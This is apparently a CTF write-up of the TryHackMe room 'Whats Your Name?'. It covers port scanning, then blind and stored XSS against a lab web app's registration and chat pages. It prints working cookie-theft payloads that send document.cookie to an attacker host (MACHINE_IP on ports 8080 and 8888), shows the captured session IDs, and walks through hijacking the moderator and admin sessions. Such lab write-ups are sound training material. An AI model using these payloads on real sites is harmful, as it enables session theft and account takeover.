---
title: Whats Your Name?
date: 2025-02-25
categories: [CTF, TryHackMe]
tags: Linux XSS 
description: Utilize client-side exploitation skills to take control of a web app.
---

[Room Link]((https://tryhackme.com/room/whatsyourname)

Before we begin we should add the `worldwap.thm` hostname to our `/etc/hosts` file

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ echo "10.10.211.158 worldwap.thm" | sudo tee -a /etc/hosts 
10.10.211.158 worldwap.thm
```

## Enumeration

### Port Scan

We use nmap to scan the machine and determine which ports on it are open

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ sudo nmap -sS -p- worldwap.thm                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 14:53 EST
Nmap scan report for worldwap.thm (10.10.211.158)
Host is up (0.087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8081/tcp open  blackice-icecap

Nmap done: 1 IP address (1 host up) scanned in 329.32 seconds
```

### Service Scan

After we determine which ports are open we can run a service scan using nmap, to gather more information on the service each port is running

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ sudo nmap -sV -sC -p 22,80,8081 worldwap.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-20 14:59 EST
Nmap scan report for worldwap.thm (10.10.211.158)
Host is up (0.092s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5a:30:a1:fe:2c:84:21:cc:89:01:e3:d7:52:9a:0a:d5 (RSA)
|   256 d7:6e:ca:c6:05:74:12:18:34:d9:04:3c:fc:78:ee:21 (ECDSA)
|_  256 bd:9a:d7:d6:81:93:6a:6f:fc:1b:02:10:c4:f6:2d:14 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Welcome
|_Requested resource was /public/html/
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.51 seconds
```

This shows us that the machine is running an ssh service as-well as two http servers

## Web App Enumeration

This is page we are greeted with when we open the web app on port 80

![Index.php](/assets/img/CTFs/Whats_Your_Name/index.jpg)

We can see in the top right corner there is a button that takes us to a registration page

![Registration](/assets/img/CTFs/Whats_Your_Name/register.jpg)

After we fill out the registration and submit it we receive this alert

![Registration Successful](/assets/img/CTFs/Whats_Your_Name/reg_success.jpg)

Then we are taken to a login page, here we can try to login with the credentials we created

![Login](/assets/img/CTFs/Whats_Your_Name/login.jpg)

However we cannot login, according to this alert this user is not verified

![Login Fail](/assets/img/CTFs/Whats_Your_Name/not_verified.jpg)

According to the webpage we need to go to `login.worldwap.thm` to login after we register, to do this we need to add `login.wordlwap.thm` to our `/etc/hosts` file 

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ sudo nano /etc/hosts
........
10.10.211.158 worldwap.thm login.worldwap.thm
```

When we go to `login.worldwap.thm` we are greeted with a blank page, however in the  source of the web page we can see a comment left by a developer directing us to `/login.php` 

![login.worldwap.thm](/assets/img/CTFs/Whats_Your_Name/login_worldwap.jpg)

Unfortunately our credentials do not work on this login page either

We will have to find another way to access the web app

## Accessing the Moderator Account

When we go back to the registration page we can test this form for xss vulnerabilities 

Since any xss vulnerabilities here will be blind we will need to send a response to our attacking machine, to do this we can run an http server using python

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) 
```

We will fill out each text box with javascript code(`<script>fetch('http://MACHINE_IP/name')</script>`) that will send a request to http server we have on our attacking machine, each request is different so we know which one is vulnerable to xss

![XSS test](/assets/img/CTFs/Whats_Your_Name/xss_test1.jpg)

Unfortunately we get an alert that tells us our registration failed due to the "username" row being too long

![Registration Failed](/assets/img/CTFs/Whats_Your_Name/reg_failed.jpg)

So we just change the username row and try again

![XSS Test](/assets/img/CTFs/Whats_Your_Name/xss_test2.jpg)

This one goes through, and after waiting a couple moments we get to hits on our http server

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.211.158 - - [23/Feb/2025 13:34:00] code 404, message File not found
10.10.211.158 - - [23/Feb/2025 13:34:00] code 404, message File not found
10.10.211.158 - - [23/Feb/2025 13:34:00] "GET /name HTTP/1.1" 404 -
10.10.211.158 - - [23/Feb/2025 13:34:00] "GET /email HTTP/1.1" 404 -
```

It looks like both the name and email rows are vulnerable to xss, to exploit this we can try stealing the cookies of whoever is viewing the registrations

To do this lets open another http server this time on port 8080

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Now we can use this javascript code to have them send their cookies to our http server

```html
<script>document.write('<img src="http://MACHINE_IP:8080?cmd='+document.cookie+'"witdh=0 hight=0 border=0 />');</script>
```

Now enter this into either the name or email row and send the form

![XSS Exploit](/assets/img/CTFs/Whats_Your_Name/xss_exploit.jpg)

Wait a few moments and we should get a hit on our http server

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.95.162 - - [23/Feb/2025 13:45:00] "GET /?cmd=PHPSESSID=453tet80nn6fpfo60t1tm1lmhk HTTP/1.1" 200
```

Now that we have their cookie we can change our cookie to it and steal their session

![cookie](/assets/img/CTFs/Whats_Your_Name/cookie.jpg)

Now that we have their session we can see `/dashboard.php` , and that we are the moderator

![Dashboard](/assets/img/CTFs/Whats_Your_Name/dashboard.jpg)

After some poking around there does not seem to much more to do on this web app so we can go to `login.worldwap.thm` and see if this moderator's cookie will help us

When we go to `login.worldwap.thm` we are again greeted with a blank page so lets go to `/login.php` 

![login.php](/assets/img/CTFs/Whats_Your_Name/login_php.jpg)

When we do that we are redirected  to `/profile.php` and we have access to the moderators account, we also find the first flag here

![Moderator Account](/assets/img/CTFs/Whats_Your_Name/moderator_profile.jpg) 

## Accessing the Admin Account

When we click on the "Go to Chat" button

![Go to Chat](/assets/img/CTFs/Whats_Your_Name/goto_chat.jpg)

We are brought to `/chat.php`, this opens a chat between us and the admin

![Chat.php](/assets/img/CTFs/Whats_Your_Name/chat.jpg)

Firstly lets test again for an xss vulnerability, we can do this using `<script>alert("XSS)</script>` this will create a popup that says XSS if it works

![XSS](/assets/img/CTFs/Whats_Your_Name/xss_chat.jpg)

We can see it does in fact work

![XSS](/assets/img/CTFs/Whats_Your_Name/xss_alert.jpg)

When we take a look at the source page we can see our message appear here

![source](/assets/img/CTFs/Whats_Your_Name/chat_source.jpg)

We can see our message in this case "test" appear between the `div` tags, this shows us that our XSS is going to be dom based

When we create our xss exploit we should close the `div` tag as well 

We are going to again steal the cookies of the admin, to do this our payload will look 

```html
</div> <img src=x onerror="location.href='http://MACHINE_IP:8888/?c='+document.cookie">
```

Before we launch this attack we will open another http server this time on port 8888

Now it is time to send payload

![XSS](/assets/img/CTFs/Whats_Your_Name/xss_cookie_steal.jpg)

Now back on the http server we should have two connections one from the admin user and one form ourselves since the page was reloaded

```console
┌──(kali㉿kali)-[~/Whats_Your_Name]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.211.158 - - [24/Feb/2025 14:57:40] "GET /?c=PHPSESSID=7a91sbbjlrt5c94msas7ufkbt1 HTTP/1.1" 200 -
10.6.48.82 - - [24/Feb/2025 14:57:47] "GET /?c=PHPSESSID=453tet80nn6fpfo60t1tm1lmhk HTTP/1.1" 200 -
```

Now all that is left to do is again change our cookie to the admin's cookie and go back to `/profile.php`, and get the final flag

![Admin](/assets/img/CTFs/Whats_Your_Name/admin_profile.jpg)


